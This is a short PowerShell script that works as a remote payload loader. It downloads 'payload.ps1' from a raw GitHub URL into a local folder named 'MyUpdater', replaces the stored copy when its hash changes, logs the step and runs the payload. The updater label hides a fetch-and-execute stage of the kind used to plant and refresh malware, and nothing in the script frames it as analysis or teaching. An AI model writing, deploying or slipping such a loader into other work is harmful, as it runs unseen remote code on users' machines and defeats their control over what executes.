$payloadUrl = "https://raw.githubusercontent.com/discosoupy/update/refs/heads/main/payload.ps1"
$localFolder = "$env:LOCALAPPDATA\MyUpdater"
$payloadPath = "$localFolder\payload.ps1"
$tempPath = "$localFolder\payload_new.ps1"
$logPath = "$localFolder\loader.log"

if (!(Test-Path $localFolder)) {
    New-Item -ItemType Directory -Path $localFolder -Force | Out-Null
}

try {
    Invoke-WebRequest -Uri $payloadUrl -OutFile $tempPath -UseBasicParsing

    $updateNeeded = $true

    if (Test-Path $payloadPath) {
        $oldHash = (Get-FileHash $payloadPath).Hash
        $newHash = (Get-FileHash $tempPath).Hash
        if ($oldHash -eq $newHash) {
            $updateNeeded = $false
        }
    }

    if ($updateNeeded) {
        Move-Item -Force $tempPath $payloadPath
        Add-Content $logPath "Updated payload at $(Get-Date)"
    }
    else {
        Remove-Item $tempPath -Force
    }
}
catch {
    Add-Content $logPath "Update failed at $(Get-Date)"
}

if (Test-Path $payloadPath) {
    Add-Content $logPath "Executed payload at $(Get-Date)"
    & $payloadPath
}
